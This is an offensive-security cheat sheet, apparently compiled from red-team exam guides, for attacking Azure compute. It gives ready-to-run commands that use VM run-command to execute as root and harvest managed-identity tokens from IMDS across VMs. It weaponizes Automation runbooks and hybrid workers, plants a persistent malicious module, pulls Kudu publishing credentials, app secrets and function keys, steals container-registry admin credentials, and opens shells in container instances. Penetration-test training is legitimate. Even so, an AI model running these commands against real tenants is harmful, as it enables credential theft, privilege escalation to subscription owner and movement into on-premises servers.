# Cloud - Azure compute RCE: RunCommand, Automation, Kudu, ACI

## VM run-command RCE to managed-identity token harvest

**Trigger:** You hold Contributor or Virtual Machine Contributor on a subscription or resource group containing VMs but have no shell.

RBAC write over a VM gives code execution with no SSH/RDP and no network line of sight, via the run-command extension which runs as SYSTEM/root through the Azure guest agent: az vm run-command invoke -g <rg> -n <vm> --command-id RunShellScript --scripts '<cmd>' (RunPowerShellScript on Windows). Chain it to steal the VM's managed-identity token by having the injected script curl IMDS. This converts a Contributor role (which cannot assign RBAC) into lateral movement: run-command every reachable VM, harvest each managed-identity token, and look for one that is Owner or User Access Administrator, or that can read Key Vault, then escalate through that identity. Enumerate targets and which carry an identity with az vm list -d -o table and az vm identity show.

```bash
az vm run-command invoke -g <rg> -n <vm> --command-id RunShellScript --scripts "id; curl -s -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'"
az vm list -d -o table
az vm identity show -g <rg> -n <vm>
```

Source: https://offsecexams.com/cheatsheets/azrte-exam---guided-by-redblock

## Automation Account runbook abuse and RunAs/hybrid-worker exec

**Trigger:** Enumeration shows an Azure Automation Account (runbooks, RunAs connection, a system-assigned identity, or a Hybrid Runbook Worker) and you have Contributor/Automation Contributor over it.

Automation Accounts run PowerShell/Python runbooks under a privileged context, so write access to them is code-exec as that context. Publish and start a malicious runbook: it executes as the Automation Account's managed identity or legacy RunAs service principal (frequently Contributor/Owner over the subscription), or on a linked Hybrid Runbook Worker it runs as SYSTEM on an on-prem server — a cloud-to-on-prem bridge. Inside the runbook, print the RunAs certificate/connection or call the metadata endpoint to steal the identity token, then reuse it. Import a malicious PowerShell module into the account for persistence that runs on every job. Because a Contributor on the automation resource can add/publish runbooks, this is a common escalation from a mid-tier Azure role to subscription owner.

```powershell
# Enumerate:
Get-AzAutomationAccount ; Get-AzAutomationRunbook -AutomationAccountName <AA> -ResourceGroupName <RG>
# Weaponize a runbook (body runs as the AA identity / on the hybrid worker):
Import-AzAutomationRunbook -Name pwn -Type PowerShell -Path .\pwn.ps1 -AutomationAccountName <AA> -ResourceGroupName <RG>
Publish-AzAutomationRunbook -Name pwn -AutomationAccountName <AA> -ResourceGroupName <RG>
Start-AzAutomationRunbook -Name pwn -AutomationAccountName <AA> -ResourceGroupName <RG> -RunOn <HybridWorkerGroup>
# runbook body: query IMDS/IDENTITY_ENDPOINT for a token, or output the RunAs connection cert
```

Source: https://offsecexams.com/cheatsheets/cartp-exam---guided-by-redblock

## App Service / Function Kudu SCM console RCE and function keys

**Trigger:** You hold Contributor over an App Service or Function App, or obtain its publishing credentials.

App Service exposes a management sidecar (Kudu/SCM) at https://<app>.scm.azurewebsites.net whose DebugConsole is an interactive shell inside the app container. Pull the creds to reach it with az webapp deployment list-publishing-credentials -g <rg> -n <app>. Code execution also comes from deploying over the app: a zip deploy or publish-profile push overwrites the running code, which then executes as the app's managed identity, whose token you grab via IDENTITY_ENDPOINT (see the managed-identity note). App settings routinely leak secrets and connection strings: az webapp config appsettings list. For Functions, az functionapp keys list yields master and function keys that let you invoke and administer functions, and injected function code pivots to the managed identity the same way.

```bash
az webapp deployment list-publishing-credentials -g <rg> -n <app>
az webapp config appsettings list -g <rg> -n <app> -o table
az functionapp keys list -g <rg> -n <fn>
# Kudu shell: https://<app>.scm.azurewebsites.net/DebugConsole
```

Source: https://offsecexams.com/cheatsheets/azrte-exam---guided-by-redblock

## ACR admin credential theft and ACI container exec

**Trigger:** You enumerate Azure Container Registries (ACR) or Container Instances (ACI).

If an ACR has the admin user enabled it exposes a static username/password to the entire registry: az acr credential show -n <registry>, then az acr login -n <registry> and docker pull <registry>.azurecr.io/<repo>:<tag> to retrieve images, which frequently embed secrets in build args and layers (diff the layers offline). For running ACI containers you can drop straight into a shell with az container exec -g <rg> -n <aci> --exec-command '/bin/sh', and if the container carries a managed identity, use its IDENTITY_ENDPOINT to pivot. Note az acr build and ACR tasks run as the registry's own identity, another execution surface worth checking.

```bash
az acr credential show -n <registry>
az acr login -n <registry> && docker pull <registry>.azurecr.io/<repo>:<tag>
az container exec -g <rg> -n <aci> --exec-command "/bin/sh"
```

Source: https://offsecexams.com/cheatsheets/azrte-exam---guided-by-redblock
